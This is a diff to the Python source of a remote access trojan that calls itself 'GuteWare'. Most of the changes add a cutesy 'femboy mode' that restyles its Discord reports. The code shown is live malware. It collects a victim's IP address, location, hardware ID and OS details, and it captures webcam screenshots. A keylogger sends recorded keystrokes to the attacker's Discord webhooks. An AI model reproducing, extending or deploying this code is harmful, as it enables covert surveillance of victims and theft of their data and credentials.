@@ -138,19 +138,19 @@ for line in data:
 
 # SET A NEW WEBHOOK FOR YOUR KEY LOGGER
 # (I'd make it in a new channel because it kinda floods the channel)
-keyloghook = "your webhook here"
+keyloghook = "a different webhook here"
 ReportDelay = 60 # time between reports (seconds)
 
 # Set your webhook for webcam recording
 # (I'd make it in a new channel because it kinda floods the channel)
     
-camhook = Webhook("your webhook here")
+camhook = Webhook("another webhook here")
 
 # Select an embed colour
 # Options: red, blue, green, purple, yellow, white, black, grey, orange, pink, teal, brown, maroon
 
 EmbedColour = red
-femboymode = False # True or False, True for femboy False for regular and stupid
+femboymode = True # True or False, True for femboy False for regular and stupid
 
 # ██╗██████╗      ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗ 
 # ██║██╔══██╗    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
@@ -195,10 +195,13 @@ hwid = str(subprocess.check_output('wmic csproduct get uuid')).split('\\r\\n')[1
 if femboymode == True:
     icon = "https://cdn.discordapp.com/attachments/920469526158639137/1003856313031348335/cherry-blossom_1f338.png" 
     author = "Guwute Nacht"
+    webhook.username = f"GuwuteWare {Version} | Author: {author}"
+    webhook.avatar_url = "https://cdn.discordapp.com/attachments/920469526158639137/1003912869609472111/femboylogho.png"
     EmbedColour = pink
 else:
     icon = "https://cdn.discordapp.com/attachments/920469526158639137/995553408499077210/unknown.png"
     author = "Gute Nacht"
+    webhook.username(f"GuwuteWare {Version} | Author: {author}")
 
 PC_INFO_EMBED = Embed(
     title=f"New request from {loginname}",
@@ -210,16 +213,39 @@ PC_INFO_EMBED.set_author(name=author, icon_url=icon)
 PC_INFO_EMBED.add_field(name="\u2063", value = f"**IP Address**: `{ip}` \n**ISP**: `{org}` \n**Hostname**: `{hostname}` \n**City**: `{city}, {postal}` \n**Country**: `{country}` \n**{RegionOrState}**: `{region}` \n **Google Maps**: https://www.google.com/maps/search/google+map++26.6644,-80.1741 \n \n**HWID**: `{hwid}` \n**OS**: `{OperatingSystem} {OSRelease} ({OSVersion})`")
 PC_INFO_EMBED.set_footer(text=f"{link}")
 
+PC_INFO_EMBED_Femboy = Embed(
+    title=f"New reqwest fwom {loginname}",
+    color=EmbedColour,
+    timestamp ='now'
+)
+
+PC_INFO_EMBED_Femboy.set_author(name=author, icon_url=icon)
+PC_INFO_EMBED_Femboy.add_field(name="\u2063", value = f"🌸**IP Addwess**: `{ip}` \n🌼**ISP**: `{org}` \n❀**Howostname**: `{hostname}` \n✿**City**: `{city}, {postal}` \n🌷**Country**: `{country}` \n🌼**{RegionOrState}**: `{region}` \n🌸**Guwugle Maps**: https://www.google.com/maps/search/google+map++26.6644,-80.1741 \n \n❀**HWID**: `{hwid}` \n🌷**OwoS**: `{OperatingSystem} {OSRelease} ({OSVersion})`")
+PC_INFO_EMBED_Femboy.set_footer(text=f"{link}")
+
 CAM_ERROR_EMBED = Embed(
     title=f"Failed to take screenshot of {loginname}'s camera :(",
     color=EmbedColour,
     timestamp ='now'
 )
+if femboymode == True:
+    webhook.send(embed=PC_INFO_EMBED_Femboy)
+else:
+    webhook.send(embed=PC_INFO_EMBED)
 
 CAM_ERROR_EMBED.set_author(name=author, icon_url=icon)
 CAM_ERROR_EMBED.add_field(name="\u2063", value = f"**Reason**: User has no webcam :(")
 CAM_ERROR_EMBED.set_footer(text=f"{link}")
-webhook.send(embed=PC_INFO_EMBED)
+
+CAM_ERROR_EMBED_Femboy = Embed(
+    title=f"🌸Faiwed to take scweenshot of {loginname}'s camwa 🥺",
+    color=EmbedColour,
+    timestamp ='now'
+)
+
+CAM_ERROR_EMBED_Femboy.set_author(name=author, icon_url=icon)
+CAM_ERROR_EMBED_Femboy.add_field(name="\u2063", value = f"🌼**Reason**: User has nowo webcam :(")
+CAM_ERROR_EMBED_Femboy.set_footer(text=f"{link}")
 
 Credit = Embed(
     title=f"Credits:",
@@ -230,6 +256,14 @@ Credit.set_author(name=author, icon_url=icon)
 Credit.add_field(name="\u2063", value = f"You are using GuteWare {Version}! \nGet it at https://github.com/dacianfan/GuteWare-python-rat \n\n<3 - Gute Nacht")
 Credit.set_footer(text=f"{link}")
 
+Credit_Femboy = Embed(
+    title=f"Cwedits:",
+    color=EmbedColour,
+)
+
+Credit_Femboy.set_author(name=author, icon_url=icon)
+Credit_Femboy.add_field(name="\u2063", value = f"🌸 You are using GuwuteWare {Version}! \nGet it at https://github.com/dacianfan/GuteWare-python-rat \n\n<3 - Gute Nacht")
+Credit_Femboy.set_footer(text=f"{link}")
 
 
 #  ██████╗██╗  ██╗██████╗  ██████╗ ███╗   ███╗███████╗    ██████╗  █████╗ ███████╗███████╗██╗    ██╗ ██████╗ ██████╗ ██████╗ ███████╗
@@ -435,11 +469,17 @@ def FirstCameraSS():
         time.sleep(1)
         os.remove("C:\\Users\\" +loginname+"\\AppData\\Local\\Temp\\webcamSS.jpg")
     else:
-        webhook.send(embed=CAM_ERROR_EMBED)
+        if femboymode == True:
+            webhook.send(embed=CAM_ERROR_EMBED_Femboy)
+        else:
+            webhook.send(embed=CAM_ERROR_EMBED)
 
 FirstCameraSS()
 
-webhook.send(embed=Credit)
+if femboymode == True:
+    webhook.send(embed=Credit_Femboy)
+else:
+    webhook.send(embed=Credit)
 
 def camss():
     working = bool()
@@ -557,9 +597,14 @@ class Keylogger:
             with open(path, 'rb') as f:
                 webhook.add_file(file=f.read(), filename='report.txt')
         else:
-            webhook.username = "Keylog Reporter"
-            webhook.avatar_url = "https://cdn.discordapp.com/attachments/920469526158639137/1003849100078350416/download_3.png"
-            embed = DiscordEmbed(title=f"Keylogger Report From {self.username} | Time: {self.end_dt}", description=self.log)
+            if femboymode == True:
+                webhook.username = "Keywog Repowoter"
+                webhook.avatar_url = "https://cdn.discordapp.com/attachments/920469526158639137/1003849100078350416/download_3.png"
+                embed = DiscordEmbed(title=f"Keywogger Repowot From {self.username} | Time: {self.end_dt}", description=self.log)
+            else:
+                webhook.username = "Keylog Reporter"
+                webhook.avatar_url = "https://cdn.discordapp.com/attachments/920469526158639137/1003849100078350416/download_3.png"
+                embed = DiscordEmbed(title=f"Keylogger Report From {self.username} | Time: {self.end_dt}", description=self.log)
             webhook.add_embed(embed)    
         webhook.execute()
         if flag:
